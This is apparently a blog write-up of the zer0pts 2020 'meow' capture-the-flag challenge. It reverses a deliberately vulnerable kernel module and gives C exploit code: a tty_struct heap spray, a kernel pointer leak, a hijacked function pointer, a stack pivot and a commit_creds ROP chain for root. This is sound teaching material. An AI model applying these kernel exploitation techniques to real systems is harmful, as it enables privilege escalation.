---
layout: "post"
title: "Meow Meow zeropts 2020"
date: 2021-3-04
tags: [Linux Kernel,Kernel Heap,SMEP,SMAP,KPTI]
---

I've been trying to learn some Linux Kernel Exploitation lately and stumbled over this simple yet beautiful challenge from zeropts 2020.

# tl;dr

+ Use the Kernel Heap overflow to Leak kernel pointers from `pty structure`.
+ Use the Kernel Heap overflow to write to the same kernel pointer `ptx_unix98_ops` from `pty structure`.
+ Pivot stack to heap using `ioctl` and a suitable gadget.
+ Classical `commit_creds(prepare_kernel_cred(0))` payload on the kernel heap to get root.

# Setting up the Debug Environment

+ Unpack the `rootfs.cpio` with 

```sh
mkdir rootfs && cd rootfs
sudo su
cat ../rootfs.cpio | cpio --extract
```

+ Edit the `init` script , comment out the `echo 1` happening on `kptr_restrict` and `dmesg_restrict`.
+ Add the `setsid /bin/cttyhack setuidgid 0 /bin/sh` to get root for debugging.
+ Disable `kaslr` in the `runner` script.

# Reversing 

Let's see what each of the module's functionalities does.

## Module_Open

```c
static int mod_open(struct inode *inode, struct file *file)
{
  if (memo == NULL) {
    memo = kmalloc(MAX_SIZE, GFP_KERNEL);
    memset(memo, 0, MAX_SIZE);
  }
  return 0;
}
```

Allocates a chunk of `0x400` bytes to the `memo` if it is found null. Hence,  only one allocation happens in the entire module's operations.


## Module_read

```c

static ssize_t mod_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{ 
  if (filp->f_pos < 0 || filp->f_pos >= MAX_SIZE) return 0;
  if (count < 0) return 0;
  if (count > MAX_SIZE) count = MAX_SIZE - *f_pos;
  if (copy_to_user(buf, &memo[filp->f_pos], count)) return -EFAULT;
  *f_pos += count;
  return count;
}

```

+ Checks if the `f_pos` if less than 0 or greater than 0x400.
+ Also checks of count is less than 0
+ If count is found to be greater than 0x400, updates count to `0x400- *f_pos`.
+ Finally, `copy_to_user` happens of max count 0x400 into the userspace buffer from the memo.
+ File position is advanced by count bytes.

## Module_write

Pretty much the same as `module_read` except that it calls `copy_from_user` of 0x400 bytes. [again , no overflow apparently :(].

```c
static ssize_t mod_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
  if (filp->f_pos < 0 || filp->f_pos >= MAX_SIZE) return 0;
  if (count < 0) return 0;
  if (count > MAX_SIZE) count = MAX_SIZE - *f_pos;
  if (copy_from_user(&memo[filp->f_pos], buf, count)) return -EFAULT;
  *f_pos += count;
  return count;
}
```

## mod_llseek

```c
static loff_t mod_llseek(struct file *filp, loff_t offset, int whence)
{
  loff_t newpos;
  switch(whence) {
  case SEEK_SET:
    newpos = offset;
    break;
  case SEEK_CUR:
    newpos = filp->f_pos + offset;
    break;
  case SEEK_END:
    newpos = strlen(memo) + offset;
    break;
  default:
    return -EINVAL;
  }
  if (newpos < 0) return -EINVAL;
  filp->f_pos = newpos;
  return newpos;
}
```

+ Lets us `lseek` to the offset in our `memo`.

# So where is the bug??

Individually , these functions are safe. But, if we combine the `llseek` and `read`, `write`, we leverage a sweet heap overflow. As you can see, the `mod_read` and `mod_write` don't have any checks for out of bounds `lseek`, hence , what we can do is, seek to the end of the memo and read or write 0x400 bytes.

# Exploitation

The idea here is, to have a kernel structure getting allocated just after our memo, so that we can read and write to it. Since, our `memo` is of size `0x400` , it will be allocated from the `kmalloc-1024` pool, and one super famous kernel structure which is also allocated from the `kmalloc-1024` pool is the good old `tty_struct`.

So, now the plan is -

+ Spray `kmalloc-1024` and get a tty structure opened near our memo.
+ `lseek` and `read` from the `tty_struct`. Leak heap and kernel function pointer.
+ Similar, write to the same function pointer, the address of heap which has the gadget to pivot stack to heap.
+ Calling `ioctl` triggers our `ptx_unix98_ops` function pointer giving us rip control to pivot stack to rop on heap.

Let's script the Leak part.

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>

#define INVALID -1

int ptmx;
unsigned long user_cs,user_sp,user_ss,user_rflags,fd;
unsigned long kbase,kheap;
unsigned long leak_buf[0x400/8];
unsigned long push_r12_pop_rsp;
unsigned long pop_rdi,prepare_kernel_cred,commit_creds,pop_rcx,mov_rdi_rax,kpti_trampoline;

void save_state(){
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    puts("[+] Saved user state!");
}

void Open_and_spray(){
    for(int i=0;i<10;i++){
        ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
        if(ptmx < 0){
            perror("[-] Failed to open ptmx");
            exit(INVALID);
        }
    }
    fd = open("/dev/memo",O_RDWR);
    if(fd < 0){
        perror("[-] Err in memo");
    }
    char buf[0x400];
    memset(buf,0x61,sizeof(buf));
    write(fd,buf,0x400);
    puts("[+] Opened memo!");
    ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
    if(ptmx < 0){
        perror("[-] Failed to open ptmx");
        exit(INVALID);
    }
}
```

As you can see, initially, we spray the `kmalloc-512` by opening `/dev/ptmx` which internally allocates `alloc_tty` structure via `kmalloc-1024` pool. So, when we open `memo` and then allocate another `ptmx`, we get contiguous allocation of `memo` followed by the `tty_struct`.

Now, we can safely get our leaks.

```c
void get_leaks(){
    lseek(fd,0x100,SEEK_SET);
    read(fd,leak_buf,0x400);
    for(int i=0;i<0x400/8;i++){
        printf("[*] leak_buf[%d] -> 0x%lx\n",i,leak_buf[i]);
    }
    kbase = leak_buf[99] - 0xe65900; //ptx_unix98_ops
    kheap = leak_buf[103] - 0x438;
    printf("[+] kbase = 0x%lx\n",kbase);
    printf("[+] kheap = 0x%lx\n",kheap);
    push_r12_pop_rsp = kbase + 0x94d4e3L; 
    pop_rdi = kbase + 0x1268L;
    pop_rcx = kbase + 0x4c852L;
    prepare_kernel_cred = kbase + 0x7bb50L;
    mov_rdi_rax = kbase + 0x19dcbL;
    commit_creds = kbase + 0x7b8b0L;
    kpti_trampoline = kbase + 0xa00a45L;
    ?printf("[+] push_r12_pop_rsp = 0x%lx\n",push_r12_pop_rsp);
}
```

You will soon know why I have used gadgets like `push_r12_pop_rsp` and `pop_rcx`. (rest everything is required for a standard cc(pkc(0)))

# ROP on Heap

Now that we have the necessary leaks, we can now go ahead and overwrite our `ptx_unix98_ops` with a fake function pointer (our pivot gadget on heap).

```c
void write_rop(){
    //overwrite the same ptx_unix98_ops with address of heap rop chain
    leak_buf[99] = kheap + 0x120;
    leak_buf[16] = push_r12_pop_rsp;

```

We use the previous buffer into which we read our leaks. We see that `ptx_unix98_ops` is at `99th` offset and thus we overwrite it with our `memo+0x120`. We also populate our `memo+0x120` which is at offset `16th` with our `pivot gadget`.

But wait , so how does that pivot actually happen. The reason is, we are calling `ioctl` on the opened `ptmx` , which will internally invoke the `ptx_unix98_ops` function pointer. So, how does this work? For that , we should closely check the arguments of the `ioctl` userspace call.

```c
int ioctl(int fd, int request, char* cmd);
```

Since, the first two arguments are `int`, they're not of much use, but the third argument is a `char *`, which means its a pointer and we fully control it. So now, we should ideally be searching for `push rdx ; pop rsp` gadgets right? Well, what I observed during debugging is that such `push rdx` gadgets are dereferencing registers which are not pointers and also not in our control. Hence , I had to now see which all registers were set to our heap pointer which we pass as argument.

After some debugging , I found that `r12`, `rdx` and `rcx` were set to our heap pointer. Hence , I used the `push r12` gadget which did not compromise with the control flow.

After that, we can nicely pivot to heap and execute our rop chain.

```c
void write_rop(){
    //overwrite the same ptx_unix98_ops with address of heap rop chain
    leak_buf[99] = kheap + 0x120;
    leak_buf[16] = push_r12_pop_rsp;
    puts("[+] Writing ROP now!");
    //building rop now
    unsigned long *rop = &leak_buf[0];
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax;
    *rop++ = commit_creds;
    *rop++ = kpti_trampoline;
    *rop++ = 0; //rdi
    *rop++ = 0; //rax
    *rop++ = (unsigned long)priv_esc;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;
    lseek(fd,0x100,SEEK_SET);
    write(fd,leak_buf,0x400);
    ioctl(ptmx,0xcafebabe,kheap+0x100-0x8);
}
```

I used a `mov_rdi_rax` gadget which essentially moves the `cred_struct` so that we can call `commit_creds(prepare_kernel_cred(0))`.

One small twitch here is, for some reason, the kernel always panicked if I directly attempted to call `mov_rdi_rax` and then `commit_creds`. Hence, I included a `pop_rcx` gadget before that which (according to my dim knowledge) must be due to some stack alignment issue? Honestly, Im not really sure.

Finally, we get our long awaited shell. Also, for some other reason (again to my dim knowledge of the internals) `system("/bin/sh")` was also issuing recursive kernel panics, and thus had to use `execve` to get root.

# Conclusion

I learnt a lot about the kernel heap from this challenge and there are things in this challenge which I have to look into (for instance , the reason for using a `pop_rcx` gadget before calling `commit_creds`).

Full Script - [Here](https://gist.github.com/PwnVerse/3aa9ac8558f29232b04be6e5365a2901)





